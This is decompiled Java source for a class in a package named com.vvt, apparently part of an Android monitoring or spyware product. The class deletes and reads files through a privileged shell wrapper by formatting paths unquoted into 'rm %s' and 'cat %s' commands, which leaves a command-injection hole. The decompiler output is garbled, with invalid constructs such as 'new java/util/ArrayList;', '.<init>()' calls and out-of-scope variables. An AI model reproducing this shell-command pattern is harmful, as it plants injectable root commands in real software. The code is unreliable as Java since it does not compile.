package com.vvt.al;

import com.vvt.shell.KMShell;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  static void a(String paramString)
  {
    int i = 1;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = paramString;
    String str = String.format("rm %s", arrayOfObject);
    try
    {
      KMShell.a(str);
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  static ArrayList b(String paramString)
  {
    int i = 0;
    boolean bool2 = a;
    if (bool2) {}
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "cat %s";
    int j = 1;
    try
    {
      Object localObject2 = new Object[j];
      Object localObject3 = null;
      localObject2[0] = paramString;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.a((String)localObject1);
      localObject2 = "\\r?\\n";
      localObject1 = ((String)localObject1).split((String)localObject2);
      j = localObject1.length;
      while (i < j)
      {
        localObject3 = localObject1[i];
        localObject3 = c((String)localObject3);
        if (localObject3 != null) {
          localArrayList.add(localObject3);
        }
        i += 1;
      }
      boolean bool1;
      return localArrayList;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  static com.vvt.al.d.a c(String paramString)
  {
    int i = 3;
    for (Object localObject = "(f=.*).*(ts=.*).*(pkg=.*)";; localObject = null)
    {
      try
      {
        localObject = Pattern.compile((String)localObject);
        localObject = ((Pattern)localObject).matcher(paramString);
        boolean bool1 = ((Matcher)localObject).find();
        if (bool1)
        {
          int j = ((Matcher)localObject).groupCount();
          if (j == i)
          {
            j = 1;
            String str1 = ((Matcher)localObject).group(j);
            str1 = str1.trim();
            i = 2;
            str1 = str1.substring(i);
            i = 2;
            String str2 = ((Matcher)localObject).group(i);
            str2 = str2.trim();
            int k = 3;
            str2 = str2.substring(k);
            long l = Long.parseLong(str2);
            int m = 3;
            localObject = ((Matcher)localObject).group(m);
            localObject = ((String)localObject).trim();
            m = 4;
            String str3 = ((String)localObject).substring(m);
            localObject = new com/vvt/al/d/a;
            ((com.vvt.al.d.a)localObject).<init>(str1, l, str3);
            return (com.vvt.al.d.a)localObject;
          }
        }
        else
        {
          bool2 = b;
          if (!bool2) {}
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          boolean bool2 = b;
          if (!bool2) {}
        }
      }
      bool2 = false;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */